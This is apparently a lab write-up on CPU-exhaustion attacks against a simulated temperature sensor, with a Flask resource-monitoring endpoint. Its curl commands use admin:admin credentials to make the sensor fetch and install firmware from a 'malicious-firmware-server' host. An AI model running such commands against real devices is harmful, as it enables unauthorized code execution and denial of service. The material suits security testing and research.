# Malicious Firmmware CPU resouce exhaustion

## Offline malicious deployer

```bash
python3 .\generate_malicious_firmware.py malicious_firmware.sh 5000


python3 -m http.server 78998


curl -X POST -u admin:admin -H "Content-Type: application/json" \
     -d '{"firmware_url": "http://127.0.0.1:13462/malicious_firmware.sh", "version": "10.2.3"}' \
     http://localhost:12384/firmware/update

```

## Resource Monitoring in Sensor

```python
@app.route('/health/resources', methods=['GET'])
def get_resource_status():
    """Get current resource usage status"""
    try:
        import psutil
    except ImportError:
        return jsonify({
            "error": "psutil not installed, cannot monitor resource usage",
            "install_hint": "Add psutil to your requirements.txt file and rebuild container"
        }), 500
    
    # Get current process
    process = psutil.Process(os.getpid())
    
    # Get CPU usage (%) - first call returns 0.0, so call twice
    process.cpu_percent()
    time.sleep(0.1)
    cpu_percent = process.cpu_percent()
    
    # Get memory usage
    memory_info = process.memory_info()
    memory_mb = memory_info.rss / (1024 * 1024)  # Convert to MB
    
    # Get number of active threads
    thread_count = threading.active_count()
    
    # System-wide resources
    system_cpu = psutil.cpu_percent()
    system_memory = psutil.virtual_memory()
    
    # Get disk usage
    disk = psutil.disk_usage('/')
    
    # Detect if firmware update is in progress
    firmware_update_active = any("firmware" in t.name.lower() for t in threading.enumerate() if hasattr(t, 'name'))
    
    return jsonify({
        "process": {
            "cpu_percent": cpu_percent,
            "memory_mb": round(memory_mb, 2),
            "active_threads": thread_count
        },
        "system": {
            "cpu_percent": system_cpu,
            "memory": {
                "total_mb": round(system_memory.total / (1024 * 1024), 2),
                "available_mb": round(system_memory.available / (1024 * 1024), 2),
                "used_mb": round((system_memory.total - system_memory.available) / (1024 * 1024), 2),
                "percent_used": system_memory.percent
            },
            "disk": {
                "total_gb": round(disk.total / (1024 * 1024 * 1024), 2),
                "used_gb": round(disk.used / (1024 * 1024 * 1024), 2),
                "free_gb": round(disk.free / (1024 * 1024 * 1024), 2),
                "percent_used": disk.percent
            }
        },
        "sensor_status": {
            "firmware_update_in_progress": firmware_update_active,
            "sensor_id": SENSOR_ID,
            "fault_mode": sensor.fault_mode,
            "data_server_connected": data_client.connected
        },
        "timestamp": time.time()
    })
```



```bash
    curl -X POST -u admin:admin \
     -H "Content-Type: application/json" \
     -d '{"firmware_url": "http://malicious-firmware-server:38888/severe_firmware.sh", "version": "1.2.3-SEVERE"}' \
     http://temperature-sensor-04:12384/firmware/update
```